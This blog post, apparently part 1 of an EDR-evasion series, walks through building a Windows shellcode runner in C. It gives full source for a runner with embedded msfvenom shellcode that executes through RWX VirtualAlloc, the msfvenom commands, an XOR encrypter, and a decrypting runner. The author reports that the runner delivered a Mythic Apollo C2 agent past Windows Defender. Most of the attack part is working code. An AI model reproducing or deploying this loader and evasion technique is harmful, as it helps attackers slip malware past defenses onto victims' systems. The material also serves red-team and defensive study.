---
title: EDR Evasion Part 1 - Basic Shellcode Runner
date: 2022-07-03 12:15:00 -0600
categories: [Evasion, Shellcode Runner]
tags: [edr, evasion, shellcode, c, walkthrough, xor, encryption, windows]     # TAG names should always be lowercase
---

Recently, I've taken a bit of a dive into EDR and AV evasion techniques, with the intent to create a tool to generate customized wrappers that can execute shellcode and bypass defenses. In this series of blog posts, I will cover the development of such a tool. I will also take the opportunity to explore EDRs and their functionality, so that we have a better understanding of what we are trying to defeat. Overall, I'll be focusing primarily on Windows environments.

## EDR Functionality

Before getting into the tool itself, let's go over some techniques that EDRs (and some AVs) use to detect malicious code. This list isn't all inclusive, but it includes some of the more common methods and therefore some of these will be covered in this series. Also, I'd like to note that they're not necessarily mutually exclusive either, as some of these are used in conjunction. For instance, sandboxing can utilize other methods, such as signature detection. With that covered, let's go through them.

- **Static analysis**

    What the name implies. The AV/EDR solution analyzes the binary on disk and flags on malicious code. This ties closely to signature detection (if not a direct subset), but I've seperated it out for the sake of this post.

- **Signature Detection**

    Commonly used by AVs and EDRs, this functionality evaluates programs based on signatures matching previously identified malware. This can include signatures like matching file hashes or using the same chunks of code.

- **Sandboxing**

    Some AVs/EDRs will analyze a program by running it briefly in a virtual environment in an attempt to identify any malicious activity. This process can be resource intensive, however, so most solutions will only execute it for a short period of time.

- **Binary Entropy**

    EDRs can also detect malicious code by inspecting the amount of entropy, or randomness, within a binary. Higher entropy can be indicative of encryption, which is sometimes used by malicious software to hide signaturized features or capabilities. 

- **IAT analysis**

    For background, all Windows portable executables (PE) contain something called the Import Address Table (IAT). Simply put, the IAT is what stores the DLL and function names that the PE file imports. Certain calls that a binary makes to the Windows API can cause an EDR to become suspicious and oftentimes these solutions will utilize this method to profile a suspect binary.

- **Event Tracing**

    Instead of statically analyzing binaries based on their contents, EDRs and AVs can also inspect the events that occur when a binary executes. By tracing the events, as the name suggests, EDRs can determine if the intent is malicious. Windows includes this feature built-in, known as [Event Tracing for Windows (ETW)](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing).
    
- **Heuristic analysis**

    Heuristic, or behavioral, analysis is a broad, catch-all term for EDR investigation that attempts to identify novel malicious software, which was previously unknown. This encompasses some of the other already mentioned methods, but it's worth mentioning here.

- **In-memory scanning**

    After a malicious binary has gained execution, EDRs and AVs can still retroactively defeat it by identifying its malicious intent in-memory. Typically, the EDR solution does this similarly to how it performs static anaylsis. For this technique, it's important to note that usually the EDR or AV are only looking at executable memory, as this is the more dangerous segment for malware to reside. 

- **API Hooking**

    Another way that EDRs will monitor a binary is by loading its own DLL into the process upon start up, where it will monitor for suspicious function calls. The EDR "hooks" into these functions, acting as a intermediary between the program and the WinAPI. If the process attempts to call a function for malicious purposes, the EDR will respond. 

## Basic Shellcode Runner

Okay, now that we've covered some EDR/AV basics, let's jump into creating our shellcode runner. 

> Remember, the purpose of a runner is to execute malicious code and bypass automated defenses. Ultimately, we are using a shellcode runner to get our malicious code, the payload, into memory without the need to alter the payload itself. A shellcode runner will provide us a lot of flexibility and options for AV/EDR evasion.
{: .prompt-tip }

The shellcode we'll use just pops calc.exe as a proof-of-concept, but in the end we'll verify our runner will still work with larger payloads, too. Using msfvenom, let's generate some shellcode. Since we'll make our runner in C, we'll use the C output format. Although it's good to know how to write shellcode, that isn't the focus here.

```console
$ msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f c
```

Okay, we'll save that for later. Now, let's start building our program. As the first iteration, it'll be quite simple. Essentially, we want to:

1. Allocate some executable memory for our shellcode. For this we will use the WinAPI function, `VirtualAlloc`.
2. Copy our shellcode to that space in memory using the address we received from our `VirtualAlloc` call.
3. Execute the shellcode.

In theory, this is pretty straight forward. In practice, however, automated defenses may present some issues. Regardless, let's start putting the code together.

At the top we'll initialize our shellcode variable **sc** as a character string. After we'll use `VirtualAlloc` to carve out our executable memory, the same amount of bytes as our shellcode. More info can on this function can be found in the [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).

```c
void *exec = VirtualAlloc(0, sizeof sc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
{: .nolineno }

This returns a pointer to the start address of this newly allocated memory space. Let's use the `memcpy` function to copy our shellcode to this memory address.

```c
memcpy(exec, sc, sizeof sc);
```
{: .nolineno }

Now that we have our shellcode in executable memory, we've just got to execute it. This is where it gets a bit tricky and we'll have to use a somewhat hacky way to get it started. The line we'll use is:

```c
((void(*)())exec)();
```
{: .nolineno }

Okay... So if you're not familiar with this line, this forces the program to point to the address of our shellcode as the next instruction. Casting exec to a function which takes no arguments and returns void, then calling said function will do just that. 

That's it! For now. This will execute whatever shellcode we use.

Here's `runner.c` put together:

```c
#include <windows.h>

int main(int argc, char **argv) {
    
    char sc[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";

    void *exec = VirtualAlloc(0, sizeof sc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy(exec, sc, sizeof sc);
    
    ((void(*)())exec)();
}
```
{: file='runner.c'}

At this point, there are couple things I'd like to point out. Our call to `VirtualAlloc` is requesting read/write execute (RWX). Few non-malicious programs request this type of memory protection, so this is already pretty suspicious. Additionally, our shellcode is built into the binary, in plain hexadecimal. As an msfvenom generated payload, it's most likely signatured by AV. Regardless, let's give it a shot.

### Testing the Runner

To start testing, we'll compile our runner. Right away, if your using a Windows host, Defender is going to flag on the resulting executable. Creating a folder or file exception and executing starts calc.exe, so we know the runner works.

![v1 Alert](/assets/img/posts/07-2022/v1.png)
_Defender alerts on the shellcode's signature._

Opening the alert, it looks like Windows Defender is flagging on an AV signature of the msfvenom shellcode, as expected. If our runner can't bypass Windows AV, it doesn't stand a chance getting passed an EDR solution.

Let's explore a potential solution and our first bypass.

## Evasion: Encrypted Shellcode

Now that we've got a foundation for our runner, we're going to modify it to include a shellcode decoder. Because our current solution is signatured, AV catches it, running or not. To disrupt this static analysis, we will have our shellcode encrypted while at rest. This should help our binary live on disk and may allow execution to occur without detection. For simplicity's sake, let's use an [XOR cipher](https://en.wikipedia.org/wiki/XOR_cipher) to encrypt our shellcode. 

To do this properly, we'll have to create a seperate encrypter binary that generates the encrypted.bin shellcode file. In future versions, we can make this all nice and pretty by making the encrypter also build our runner binary with the encrypted shellcode built-in, but for now, let's just have it output this file for the runner to read in. 

---

### The Encypter

Let's get started. First, we'll create our encrypter. This will be a pretty bare solution, error handling and other best practices will be resolved later. 

After initializing our variables, we'll need to access our two files: one is where we'll read in our shellcode, shellcode.bin, and the other is where we'll write our encrypted shellcode, enc.bin. These files will reside in the same directory as our encypter. Since we'll be reading/writing binary files, we'll use the `b` mode. If enc.bin doesn't exist, the program will create it.

Additionally, we'll get the statistics of our shellcode file so we know how much memory we need to allocate. 

```c
enc_file = fopen("enc.bin", "wb+");
sc_file = fopen("shellcode.bin", "rb");

stat("shellcode.bin", &stats);
```

Once we have our stats, we'll initialize and allocate memory for two character arrays, which will store both the raw binary from the shellcode file and the encrypted output. After, we'll read the data in from the shellcode.bin file.

```c
char* sc = malloc(stats.st_size);
char* sc_xor = malloc(stats.st_size);

fread(sc, stats.st_size, 1, sc_file);
```

We'll loop through the shellcode size, where we will XOR each byte by the key, which we initialized as 5. In most languages, the XOR operator is `^`.

```c
printf("Encrypting shellcode...\n");

for(int i = 0; i < stats.st_size; i++){
    sc_xor[i] = sc[i] ^ key;
}
```

After encrypting the shellcode, all we need to do now is write it to the file we created earlier, enc.bin. Finally, we'll close our files and free the memory we've allocated. All together, our shellcode encryptor looks like:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char **argv) {

    unsigned char key = 5;
    FILE *enc_file;
    FILE *sc_file;
    struct stat stats;

    enc_file = fopen("enc.bin", "wb+");
    sc_file = fopen("shellcode.bin", "rb");

    stat("shellcode.bin", &stats);

    char* sc = malloc(stats.st_size);
    char* sc_xor = malloc(stats.st_size);

    fread(sc, stats.st_size, 1, sc_file);

    printf("Encrypting shellcode...\n");

    for(int i = 0; i < stats.st_size; i++){
        sc_xor[i] = sc[i] ^ key;
    }
    printf("Writing to file...\n");
    fwrite(sc_xor, 1, stats.st_size, enc_file);
    printf("Done Writing!\n");

    fclose(enc_file);
    fclose(sc_file);
    free(sc_xor);
    free(sc);
}
```
{: file='encrypter.c'}

All that's left to do is create our shellcode.bin, we'll use msfvenom like we did before, but we'll output it to a file instead.

```console
$ msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw > shellcode.bin
```

Awesome, now let's modify our runner to read and decrypt the enc.bin file.

### Decrypt and Run

Essentially, we'll perform the encrypter's flow in reverse, then execute our shellcode like before. 

Now that the shellcode is no longer hardcoded, we'll need to read in the enc.bin file. We'll also get the stats of the enc.bin file, so we can allocate memory for our character strings for the encrypted and raw shellcode. Once we read in the bytes from the file, we'll decrypt it using the same key as we used in our encrypter. 

After, the shellcode will be executed like before. Our new and improved runner, complete:

```c
#include <windows.h>
#include <stdio.h>
#include <sys/stat.h>

int main(int argc, char **argv) {
    
    unsigned char key = 5;
    FILE *enc_file;
    char input;
    struct stat stats;

    enc_file = fopen("enc.bin", "rb");
    stat("enc.bin", &stats);

    char* enc_sc = malloc(stats.st_size);
    char* sc = malloc(stats.st_size);

    fread(enc_sc, stats.st_size, 1, enc_file);

    for(int i = 0; i < stats.st_size; i++) {
        sc[i] = enc_sc[i] ^ key;    
    }

    void *exec = VirtualAlloc(0, stats.st_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy(exec, sc, stats.st_size);
    
    ((void(*)())exec)();
    
    fclose(enc_file);
    free(enc_sc);
    free(sc);
}
```
{: file='runner.c'}

Let's test it out.

### Shellcode Runner: Take Two

After prepping our workplace, we're ready to begin. Compiling and executing the encrypter outputs a enc.bin. This step would take place on a machine we own and the generated enc.bin and runner.exe will be placed together on the target machine. 

Next, we'll compile and execute our runner, with AV enabled. Right away, calc.exe opens. Progress! 

![calc-success](/assets/img/posts/07-2022/calc-pop.png)
_Calc.exe executes despite AV._

Okay, that's a great proof-of-concept, but calc.exe is pretty low-hanging. Let's spin up our favorite C2, generate some shellcode, and see if we can gain execution. For this, I'll use Mythic with an Apollo agent.

Just for demonstration, I've generated an apollo executable and dropped it onto a host with Windows Defender. It's signatured so right away, it gets flagged and quarantined, as expected.

![apollo.exe](/assets/img/posts/07-2022/apollo-exe.png)
_The Apollo agent gets quarantined by AV._

Now, back in Mythic, let's generate a new payload, this time as shellcode. We'll name it shellcode.bin so it's compatible with our encrypter. We'll put this new file in the same directory as our encrypter, and we'll run it. If everything worked, we should get a new enc.bin file. 

We'll drop both the runner.exe and the enc.bin onto our target system, keeping them in the same directory. Like we mentioned earlier, we can have our encrypter also build our runner binary with the encrypted shellcode built in, however, this would increase the risk of detection from a method like sandboxing. 

Good news, dropping the files to disk doesn't get flagged immediately. After execution, it looks like our runner doesn't raise suspicion with the AV and has made it to memory. 

![v2-running](/assets/img/posts/07-2022/v2.png)
_Runner.exe in memory with Apollo, with AV enabled._

Back in Mythic, we can see we successfully received our callback, despite Windows Defender being enabled. 

![mythic-callback](/assets/img/posts/07-2022/callback.png)
_The Apollo agent successfully called back to Mythic._

Sucess! We've got our malware into memory, bypassing Defender.

## Final Thoughts

This runner demonstrates how encrypting our shellcode can help evade static detection methods used by AV and EDRs. However, odds are that this current iteration would be ineffective against EDRs or more sophisticated automated solutions. For instance, our runner uses the WinAPI function, `VirtualAlloc`, which gets hooked by most EDRs. We're also allocating read/write execute (RWX) memory, which is not typically used by benign code, but is used often by malware. We'll continue to explore bypasses to these detection methods in future posts.

Finally, I just want to emphasize that this is a means to effectively get malware on disk and execute it, but doesn't prevent heuristic or other in-memory analysis from occurring post-execution. 

![behavior-detected](/assets/img/posts/07-2022/detected.png)
_Runner.exe gets flagged after suspicious behavior._

After running a powerpick command on our agent, Windows Defender flags on this behavior and kills the process. Migrating away from this process would probably increase survivability. Regardless, the point is that, although in-memory evasion may be explored later, it is outside the scope of this series. 

In part 2, we'll continue to delve into other means to ensure our payload can bypass EDR and gain execution.  